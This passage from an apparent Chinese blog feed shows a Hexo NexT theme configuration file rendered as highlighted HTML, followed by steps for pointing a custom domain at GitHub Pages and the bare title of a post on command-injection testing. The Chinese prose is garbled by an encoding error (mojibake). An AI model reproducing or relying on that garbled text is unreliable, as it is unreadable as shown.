class="attr">menu:</span></span><br><span class="line"><span class="attr">  home:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="string">/categories</span></span><br><span class="line"><span class="attr">  about:</span> <span class="string">/about</span></span><br><span class="line"><span class="attr">  archives:</span> <span class="string">/archives</span></span><br><span class="line"><span class="attr">  tags:</span> <span class="string">/tags</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml</span></span><br><span class="line">  <span class="comment">#commonweal: /404.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable/Disable menu icons.</span></span><br><span class="line"><span class="comment"># Icon Mapping:</span></span><br><span class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></span><br><span class="line"><span class="comment">#   Key is the name of menu item and value is the name of FontAwsome icon. Key is case-senstive.</span></span><br><span class="line"><span class="comment">#   When an question mask icon presenting up means that the item has no mapping icon.</span></span><br><span class="line"><span class="attr">menu_icons:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome</span></span><br><span class="line"><span class="attr">  home:</span> <span class="string">home</span></span><br><span class="line"><span class="attr">  about:</span> <span class="string">user</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="string">th</span></span><br><span class="line"><span class="attr">  schedule:</span> <span class="string">calendar</span></span><br><span class="line"><span class="attr">  tags:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">  archives:</span> <span class="string">archive</span></span><br><span class="line"><span class="attr">  sitemap:</span> <span class="string">sitemap</span></span><br><span class="line"><span class="attr">  commonweal:</span> <span class="string">heartbeat</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Scheme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Font Settings</span></span><br><span class="line"><span class="comment"># - Find fonts on Google Fonts (https://www.google.com/fonts)</span></span><br><span class="line"><span class="comment"># - All fonts set here will have the following styles:</span></span><br><span class="line"><span class="comment">#     light, light italic, normal, normal intalic, bold, bold italic</span></span><br><span class="line"><span class="comment"># - Be aware that setting too much fonts will cause site running slowly</span></span><br><span class="line"><span class="comment"># - Introduce in 5.0.1</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="attr">font:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Uri of fonts host. E.g. //fonts.googleapis.com (Default)</span></span><br><span class="line"><span class="attr">  host:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Global font settings used on &lt;body&gt; element.</span></span><br><span class="line"><span class="attr">  global:</span></span><br><span class="line">    <span class="comment"># external: true will load this font family from host.</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span> <span class="string">Lato</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for Headlines (h1, h2, h3, h4, h5, h6)</span></span><br><span class="line">  <span class="comment"># Fallback to `global` font settings.</span></span><br><span class="line"><span class="attr">  headings:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for posts</span></span><br><span class="line">  <span class="comment"># Fallback to `global` font settings.</span></span><br><span class="line"><span class="attr">  posts:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for Logo</span></span><br><span class="line">  <span class="comment"># Fallback to `global` font settings.</span></span><br><span class="line">  <span class="comment"># The `size` option use `px` as unit</span></span><br><span class="line"><span class="attr">  logo:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"><span class="attr">    size:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></span><br><span class="line"><span class="attr">  codes:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    family:</span></span><br><span class="line"><span class="attr">    size:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Sidebar Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Links</span></span><br><span class="line"><span class="comment"># Key is the link label showing to end users.</span></span><br><span class="line"><span class="comment"># Value is the target link (E.g. GitHub: https://github.com/iissnan)</span></span><br><span class="line"><span class="comment">#social:</span></span><br><span class="line">  <span class="comment">#LinkLabel: Link</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social Links Icons</span></span><br><span class="line"><span class="comment"># Icon Mapping:</span></span><br><span class="line"><span class="comment">#   Map a menu item to a specific FontAwesome icon name.</span></span><br><span class="line"><span class="comment">#   Key is the name of the item and value is the name of FontAwsome icon. Key is case-senstive.</span></span><br><span class="line"><span class="comment">#   When an globe mask icon presenting up means that the item has no mapping icon.</span></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Icon Mappings.</span></span><br><span class="line">  <span class="comment"># KeyMapsToSocalItemKey: NameOfTheIconFromFontAwesome</span></span><br><span class="line"><span class="attr">  GitHub:</span> <span class="string">github</span></span><br><span class="line"><span class="attr">  Twitter:</span> <span class="string">twitter</span></span><br><span class="line"><span class="attr">  Weibo:</span> <span class="string">weibo</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="comment"># in theme directory(source/images): /images/avatar.jpg</span></span><br><span class="line"><span class="comment"># in site  directory(source/uploads): /uploads/avatar.jpg</span></span><br><span class="line"><span class="comment">#avatar:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Table Of Contents in the Sidebar</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line"><span class="attr">  number:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creative Commons 4.0 International License.</span></span><br><span class="line"><span class="comment"># http://creativecommons.org/</span></span><br><span class="line"><span class="comment"># Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span></span><br><span class="line"><span class="comment">#creative_commons: by-nc-sa</span></span><br><span class="line"><span class="comment">#creative_commons:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># Sidebar Position, available value: left | right</span></span><br><span class="line"><span class="attr">  position:</span> <span class="string">left</span></span><br><span class="line">  <span class="comment">#position: right</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sidebar Display, available value:</span></span><br><span class="line">  <span class="comment">#  - post    expand on posts automatically. Default.</span></span><br><span class="line">  <span class="comment">#  - always  expand for all pages automatically</span></span><br><span class="line">  <span class="comment">#  - hide    expand only when click on the sidebar toggle icon.</span></span><br><span class="line">  <span class="comment">#  - remove  Totally remove sidebar including sidebar toggler.</span></span><br><span class="line"><span class="attr">  display:</span> <span class="string">post</span></span><br><span class="line">  <span class="comment">#display: always</span></span><br><span class="line">  <span class="comment">#display: hide</span></span><br><span class="line">  <span class="comment">#display: remove</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Blogrolls</span></span><br><span class="line"><span class="comment">#links_title: Links</span></span><br><span class="line"><span class="comment">#links_layout: block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="comment">#links:</span></span><br><span class="line">  <span class="comment">#Title: http://example.com/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Post Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically scroll page to section which is under &lt;!-- more --&gt; mark.</span></span><br><span class="line"><span class="attr">scroll_to_more:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically excerpt description in homepage as preamble text.</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Automatically Excerpt. Not recommand.</span></span><br><span class="line"><span class="comment"># Please use &lt;!-- more --&gt; in the post to control excerpt accurately.</span></span><br><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  length:</span> <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Post meta display settings</span></span><br><span class="line"><span class="attr">post_meta:</span></span><br><span class="line"><span class="attr">  item_text:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  created_at:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  updated_at:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Wechat Subscriber</span></span><br><span class="line"><span class="comment">#wechat_subscriber:</span></span><br><span class="line">  <span class="comment">#enabled: true</span></span><br><span class="line">  <span class="comment">#qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg</span></span><br><span class="line">  <span class="comment">#description: ex. subscribe to my blog by scanning my public wechat account</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Misc Theme Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom Logo.</span></span><br><span class="line"><span class="comment"># !!Only available for Default Scheme currently.</span></span><br><span class="line"><span class="comment"># Options:</span></span><br><span class="line"><span class="comment">#   enabled: [true/false] - Replace with specific image</span></span><br><span class="line"><span class="comment">#   image: url-of-image   - Images's url</span></span><br><span class="line"><span class="attr">custom_logo:</span></span><br><span class="line"><span class="attr">  enabled:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  image:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code Highlight theme</span></span><br><span class="line"><span class="comment"># Available value:</span></span><br><span class="line"><span class="comment">#    normal | night | night eighties | night blue | night bright</span></span><br><span class="line"><span class="comment"># https://github.com/chriskempson/tomorrow-theme</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Third Party Services Settings</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  cdn:</span> <span class="string">//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local search</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></span><br><span class="line"><span class="attr">  field:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">  format:</span> <span class="string">html</span></span><br><span class="line"><span class="attr">  limit:</span> <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Swiftype Search API Key</span></span><br><span class="line"><span class="comment">#swiftype_key: oUgCiUNA9jix_1j3uXpn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Analytics ID</span></span><br><span class="line"><span class="attr">baidu_analytics:</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Duoshuo ShortName</span></span><br><span class="line"><span class="attr">duoshuo_shortname:</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Disqus</span></span><br><span class="line"><span class="comment">#disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hypercomments</span></span><br><span class="line"><span class="comment">#hypercomments_id:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gentie productKey</span></span><br><span class="line"><span class="comment">#gentie_productKey:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Support for youyan comments system.</span></span><br><span class="line"><span class="comment"># You can get your uid from http://www.uyan.cc</span></span><br><span class="line"><span class="comment">#youyan_uid: your uid</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Baidu Share</span></span><br><span class="line"><span class="comment"># Available value:</span></span><br><span class="line"><span class="comment">#    button | slide</span></span><br><span class="line"><span class="comment"># Warning: Baidu Share does not support https.</span></span><br><span class="line"><span class="comment">#baidushare:</span></span><br><span class="line"><span class="comment">##  type: button</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Share</span></span><br><span class="line"><span class="comment">#jiathis:</span></span><br><span class="line"><span class="comment"># Warning: JiaThis does not support https.</span></span><br><span class="line"><span class="comment">#add_this_id:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Share</span></span><br><span class="line"><span class="comment">#duoshuo_share: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Webmaster tools verification setting</span></span><br><span class="line"><span class="comment"># See: https://www.google.com/webmasters/</span></span><br><span class="line"><span class="comment">#google_site_verification:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Analytics</span></span><br><span class="line"><span class="comment">#google_analytics:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CNZZ count</span></span><br><span class="line"><span class="comment">#cnzz_siteid:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Application Insights</span></span><br><span class="line"><span class="comment"># See https://azure.microsoft.com/en-us/services/application-insights/</span></span><br><span class="line"><span class="comment"># application_insights:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make duoshuo show UA</span></span><br><span class="line"><span class="comment"># user_id must NOT be null when admin_enable is true!</span></span><br><span class="line"><span class="comment"># you can visit http://dev.duoshuo.com get duoshuo user id.</span></span><br><span class="line"><span class="attr">duoshuo_info:</span></span><br><span class="line"><span class="attr">  ua_enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  admin_enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  user_id:</span> <span class="number">0</span></span><br><span class="line">  <span class="comment">#admin_nickname: Author</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Facebook SDK Support.</span></span><br><span class="line"><span class="comment"># https://github.com/iissnan/hexo-theme-next/pull/410</span></span><br><span class="line"><span class="attr">facebook_sdk:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  app_id:</span>       <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line"><span class="attr">  fb_admin:</span>     <span class="comment">#&lt;user_id&gt;</span></span><br><span class="line"><span class="attr">  like_button:</span>  <span class="comment">#true</span></span><br><span class="line"><span class="attr">  webmaster:</span>    <span class="comment">#true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Facebook comments plugin</span></span><br><span class="line"><span class="comment"># This plugin depends on Facebook SDK.</span></span><br><span class="line"><span class="comment"># If facebook_sdk.enable is false, Facebook comments plugin is unavailable.</span></span><br><span class="line"><span class="attr">facebook_comments_plugin:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  num_of_posts:</span> <span class="number">10</span>  <span class="comment"># min posts num is 1</span></span><br><span class="line"><span class="attr">  width:</span> <span class="number">100</span><span class="string">%</span>       <span class="comment"># default width is 550px</span></span><br><span class="line"><span class="attr">  scheme:</span> <span class="string">light</span>     <span class="comment"># default scheme is light (light or dark)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show number of visitors to each article.</span></span><br><span class="line"><span class="comment"># You can visit https://leancloud.cn get AppID and AppKey.</span></span><br><span class="line"><span class="attr">leancloud_visitors:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  app_id:</span>  <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line"><span class="attr">  app_key:</span> <span class="comment">#&lt;app_key&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show PV/UV of the website/page with busuanzi.</span></span><br><span class="line"><span class="comment"># Get more information on http://ibruce.info/2015/04/04/busuanzi/</span></span><br><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="comment"># count values only if the other configs are false</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># custom uv span for the whole site</span></span><br><span class="line"><span class="attr">  site_uv:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  site_uv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-user"&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="attr">  site_uv_footer:</span></span><br><span class="line">  <span class="comment"># custom pv span for the whole site</span></span><br><span class="line"><span class="attr">  site_pv:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  site_pv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-eye"&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="attr">  site_pv_footer:</span></span><br><span class="line">  <span class="comment"># custom pv span for one page only</span></span><br><span class="line"><span class="attr">  page_pv:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  page_pv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-file-o"&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="attr">  page_pv_footer:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tencent analytics ID</span></span><br><span class="line"><span class="comment"># tencent_analytics:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span></span><br><span class="line"><span class="attr">baidu_push:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Google Calendar</span></span><br><span class="line"><span class="comment"># Share your recent schedule to others via calendar page</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># API Documentation:</span></span><br><span class="line"><span class="comment"># https://developers.google.com/google-apps/calendar/v3/reference/events/list</span></span><br><span class="line"><span class="attr">calendar:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  calendar_id:</span> <span class="string">&lt;required&gt;</span></span><br><span class="line"><span class="attr">  api_key:</span> <span class="string">&lt;required&gt;</span></span><br><span class="line"><span class="attr">  orderBy:</span> <span class="string">startTime</span></span><br><span class="line"><span class="attr">  offsetMax:</span> <span class="number">24</span></span><br><span class="line"><span class="attr">  offsetMin:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">  timeZone:</span></span><br><span class="line"><span class="attr">  showDeleted:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  singleEvents:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  maxResults:</span> <span class="number">250</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Algolia Search</span></span><br><span class="line"><span class="attr">algolia_search:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  hits:</span></span><br><span class="line"><span class="attr">    per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></span><br><span class="line"><span class="attr">    hits_empty:</span> <span class="string">"We didn't find any results for the search: $&#123;query&#125;"</span></span><br><span class="line"><span class="attr">    hits_stats:</span> <span class="string">"$&#123;hits&#125; results found in $&#123;time&#125; ms"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#! ---------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#! DO NOT EDIT THE FOLLOWING SETTINGS</span></span><br><span class="line"><span class="comment">#! UNLESS YOU KNOW WHAT YOU ARE DOING</span></span><br><span class="line"><span class="comment">#! ---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Motion</span></span><br><span class="line"><span class="attr">use_motion:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fancybox</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canvas-nest</span></span><br><span class="line"><span class="attr">canvas_nest:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Script Vendors.</span></span><br><span class="line"><span class="comment"># Set a CDN address for the vendor you want to customize.</span></span><br><span class="line"><span class="comment"># For example</span></span><br><span class="line"><span class="comment">#    jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js</span></span><br><span class="line"><span class="comment"># Be aware that you should use the same version as internal ones to avoid potential problems.</span></span><br><span class="line"><span class="comment"># Please use the https protocol of CDN files when you enable https on your site.</span></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line">  <span class="comment"># Internal path prefix. Please do not edit it.</span></span><br><span class="line"><span class="attr">  _internal:</span> <span class="string">lib</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 2.1.3</span></span><br><span class="line"><span class="attr">  jquery:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 2.1.5</span></span><br><span class="line">  <span class="comment"># See: http://fancyapps.com/fancybox/</span></span><br><span class="line"><span class="attr">  fancybox:</span></span><br><span class="line"><span class="attr">  fancybox_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.0.6</span></span><br><span class="line">  <span class="comment"># See: https://github.com/ftlabs/fastclick</span></span><br><span class="line"><span class="attr">  fastclick:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.9.7</span></span><br><span class="line">  <span class="comment"># See: https://github.com/tuupola/jquery_lazyload</span></span><br><span class="line"><span class="attr">  lazyload:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.2.1</span></span><br><span class="line">  <span class="comment"># See: http://VelocityJS.org</span></span><br><span class="line"><span class="attr">  velocity:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.2.1</span></span><br><span class="line">  <span class="comment"># See: http://VelocityJS.org</span></span><br><span class="line"><span class="attr">  velocity_ui:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 0.7.9</span></span><br><span class="line">  <span class="comment"># See: https://faisalman.github.io/ua-parser-js/</span></span><br><span class="line"><span class="attr">  ua_parser:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 4.6.2</span></span><br><span class="line">  <span class="comment"># See: http://fontawesome.io/</span></span><br><span class="line"><span class="attr">  fontawesome:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1</span></span><br><span class="line">  <span class="comment"># https://www.algolia.com</span></span><br><span class="line"><span class="attr">  algolia_instant_js:</span></span><br><span class="line"><span class="attr">  algolia_instant_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Internal version: 1.0.0</span></span><br><span class="line">  <span class="comment"># https://github.com/hustcc/canvas-nest.js</span></span><br><span class="line"><span class="attr">  canvas_nest:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Assets</span></span><br><span class="line"><span class="attr">css:</span> <span class="string">css</span></span><br><span class="line"><span class="attr">js:</span> <span class="string">js</span></span><br><span class="line"><span class="attr">images:</span> <span class="string">images</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Theme version</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">5.1</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h4 id="ä¸ªæ€§åŒ–è®¾ç½®"><a href="#ä¸ªæ€§åŒ–è®¾ç½®" class="headerlink" title="ä¸ªæ€§åŒ–è®¾ç½®"></a>ä¸ªæ€§åŒ–è®¾ç½®</h4><p>æŒ‰ç…§<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT ä½¿ç”¨æ–‡æ¡£</a>è®¾ç½®ä¸€ä¸‹ï¼Œå…¶ä¸­çš„å†…å®¹ä¸‹é¢ä¸å†èµ˜è¿°ã€‚</p><h4 id="ç»‘å®šä¸ªäººåŸŸå"><a href="#ç»‘å®šä¸ªäººåŸŸå" class="headerlink" title="ç»‘å®šä¸ªäººåŸŸå"></a>ç»‘å®šä¸ªäººåŸŸå</h4><p>1ã€åœ¨sourceæ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ªCNAMEæ–‡ä»¶ï¼ˆæ— åç¼€åï¼‰ï¼Œç„¶åç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ï¼Œåœ¨é¦–è¡Œæ·»åŠ ä½ çš„ç½‘ç«™åŸŸåï¼Œå¦‚<a href="https://link.zhihu.com/?target=http%3A//xxxx.com" target="_blank" rel="noopener">http://xxxx.com</a>ï¼Œæ³¨æ„å‰é¢æ²¡æœ‰http://ï¼Œä¹Ÿæ²¡æœ‰wwwï¼Œç„¶åä½¿ç”¨hexo g &amp;&amp; hexo dä¸Šä¼ éƒ¨ç½²ã€‚<br>2ã€åœ¨åŸŸåè§£ææä¾›å•†ï¼Œä¸‹é¢ä»¥dnspodä¸ºä¾‹ã€‚<br>ï¼ˆ1ï¼‰å…ˆæ·»åŠ ä¸€ä¸ªCNAMEï¼Œä¸»æœºè®°å½•å†™@ï¼Œåé¢è®°å½•å€¼å†™ä¸Šä½ çš„<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a><br>ï¼ˆ2ï¼‰å†æ·»åŠ ä¸€ä¸ªCNAMEï¼Œä¸»æœºè®°å½•å†™wwwï¼Œåé¢è®°å½•å€¼ä¹Ÿæ˜¯<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a><br>è¿™æ ·åˆ«äººç”¨wwwå’Œä¸ç”¨wwwéƒ½èƒ½è®¿é—®ä½ çš„ç½‘ç«™ï¼ˆå…¶å®wwwçš„æ–¹å¼ï¼Œä¼šå…ˆè§£ææˆ<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a>ï¼Œç„¶åæ ¹æ®CNAMEå†å˜æˆ<a href="https://link.zhihu.com/?target=http%3A//xxx.com" target="_blank" rel="noopener">http://xxx.com</a>ï¼Œå³ä¸­é—´æ˜¯ç»è¿‡ä¸€æ¬¡è½¬æ¢çš„ï¼‰ã€‚ä¸Šé¢ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯CNAMEåˆ«åè®°å½•ï¼Œä¹Ÿæœ‰äººä½¿ç”¨Aè®°å½•ï¼Œåé¢çš„è®°å½•å€¼æ˜¯å†™github pageé‡Œé¢çš„ipåœ°å€ï¼Œä½†æœ‰æ—¶å€™IPåœ°å€ä¼šæ›´æ”¹ï¼Œå¯¼è‡´æœ€åè§£æä¸æ­£ç¡®ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¨èç”¨CNAMEåˆ«åè®°å½•è¦å¥½äº›ï¼Œä¸å»ºè®®ç”¨IPã€‚<br>3ã€ç­‰ååˆ†é’Ÿå·¦å³ï¼Œåˆ·æ–°æµè§ˆå™¨ï¼Œç”¨ä½ è‡ªå·±åŸŸåè®¿é—®ä¸‹è¯•è¯•(<a href="https://www.zhihu.com/question/31377141/answer/87541858" target="_blank" rel="noopener">å‚è€ƒ</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;GitHub Pages æœ¬ç”¨äºä»‹ç»æ‰˜ç®¡åœ¨ GitHub çš„é¡¹ç›®ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ­å»ºåšå®¢ï¼Œæœ‰300Må…è´¹ç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;hexoæ˜¯ä¸€ä¸ªåŸºäºNode.jsçš„é™æ€åšå®¢ç¨‹åºï¼Œå¯ä»¥æ–¹ä¾¿çš„ç”Ÿæˆé™æ€ç½‘é¡µæ‰˜ç®¡åœ¨githubå’ŒHerokuä¸Šã€‚ä½œè€…æ˜¯æ¥è‡ªå°æ¹¾çš„&lt;a href=&quot;https:
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>commix-ç³»ç»Ÿå‘½ä»¤æ³¨å…¥è‡ªåŠ¨åŒ–æµ‹è¯•å®ä¾‹</title>
